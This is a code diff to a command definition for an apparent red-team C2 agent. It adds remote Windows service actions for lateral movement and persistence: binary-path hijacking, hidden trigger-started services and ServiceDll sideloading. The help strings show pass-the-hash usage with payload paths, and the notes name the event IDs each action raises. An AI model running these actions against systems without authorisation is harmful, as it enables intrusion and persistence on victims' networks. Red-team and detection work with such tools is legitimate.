@@ -14,11 +14,11 @@ func init() {
 			ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "remoteservice_new.js"),
 			Author:     "@galoryber",
 		},
-		Description:         "Manage services on remote Windows hosts via SVCCTL RPC over SMB (port 445). List, query, create, start, stop, and delete services. Supports pass-the-hash. Cross-platform — runs from Windows, Linux, or macOS agents.",
-		HelpString:          "remote-service -action list -server 192.168.1.1 -username admin -password pass -domain CORP\nremote-service -action query -server dc01 -name Spooler -username admin -hash aad3b435b51404ee:8846f7eaee8fb117\nremote-service -action create -server 192.168.1.1 -name TestSvc -binpath C:\\payload.exe -username admin -password pass\nremote-service -action start -server 192.168.1.1 -name TestSvc -username admin -password pass\nremote-service -action stop -server dc01 -name TestSvc -username admin -password pass\nremote-service -action delete -server dc01 -name TestSvc -username admin -password pass",
-		Version:             1,
+		Description:         "Manage services on remote Windows hosts via SVCCTL RPC over SMB (port 445). List, query, create, start, stop, delete, modify-path (hijack existing service binpath), trigger (create trigger-started service), dll-sideload (ServiceDll hijack). Supports pass-the-hash.",
+		HelpString:          "remote-service -action list -server 192.168.1.1 -username admin -password pass -domain CORP\nremote-service -action query -server dc01 -name Spooler -username admin -hash aad3b435b51404ee:8846f7eaee8fb117\nremote-service -action create -server 192.168.1.1 -name TestSvc -binpath C:\\payload.exe -username admin -password pass\nremote-service -action modify-path -server dc01 -name Spooler -binpath C:\\payload.exe -username admin -password pass\nremote-service -action trigger -server dc01 -name HiddenSvc -binpath C:\\payload.exe -start_type network -username admin -password pass\nremote-service -action dll-sideload -server dc01 -name wuauserv -binpath C:\\attacker.dll -username admin -password pass",
+		Version:             2,
 		Author:              "@galoryber",
-		MitreAttackMappings: []string{"T1569.002", "T1543.003", "T1007"},
+		MitreAttackMappings: []string{"T1569.002", "T1543.003", "T1007", "T1574.001"},
 		CommandAttributes: agentstructs.CommandAttribute{
 			SupportedOS: []string{
 				agentstructs.SUPPORTED_OS_WINDOWS,
@@ -33,7 +33,7 @@ func init() {
 				ModalDisplayName: "Action",
 				Description:      "Operation to perform: list (enumerate services), query (get config/status), create, start, stop, delete",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
-				Choices:          []string{"list", "query", "create", "start", "stop", "delete"},
+				Choices:          []string{"list", "query", "create", "start", "stop", "delete", "modify-path", "trigger", "dll-sideload"},
 				DefaultValue:     "list",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{ParameterIsRequired: true, GroupName: "Default"},
@@ -165,6 +165,12 @@ func init() {
 				msg += " Service deletion may trigger alerts for defense evasion."
 			case "start", "stop":
 				msg += " Service state changes generate Event ID 7036 and may be monitored."
+			case "modify-path":
+				msg += " CRITICAL: Modifies existing service binary path (ChangeServiceConfig). Generates Event ID 7040 (service config change). EDR products monitor SCM config changes. Original path is restored after execution."
+			case "trigger":
+				msg += " Creates trigger-started service (demand start + SERVICE_TRIGGER_INFO). Less monitored than auto-start but still generates Event ID 7045. Trigger fires on next qualifying event."
+			case "dll-sideload":
+				msg += " CRITICAL: Modifies ServiceDll registry value via WinReg RPC. Opens two SMB pipes (svcctl + winreg). Sysmon Event ID 13 + 7 will fire. Original DLL path is restored after restart."
 			default:
 				msg += " Service enumeration generates network logon events."
 			}
@@ -192,7 +198,7 @@ func init() {
 			createArtifact(taskData.Task.ID, "Network Connection", artifactMsg)
 			display := fmt.Sprintf("%s %s %s", action, server, name)
 			response.DisplayParams = &display
-			if action == "create" || action == "delete" || action == "start" || action == "stop" {
+			if action == "create" || action == "delete" || action == "start" || action == "stop" || action == "modify-path" || action == "trigger" || action == "dll-sideload" {
 				logOperationEvent(taskData.Task.ID,
 					fmt.Sprintf("[LATERAL] remote-service %s: %s on %s from %s", action, name, server, taskData.Callback.Host), true)
 			}
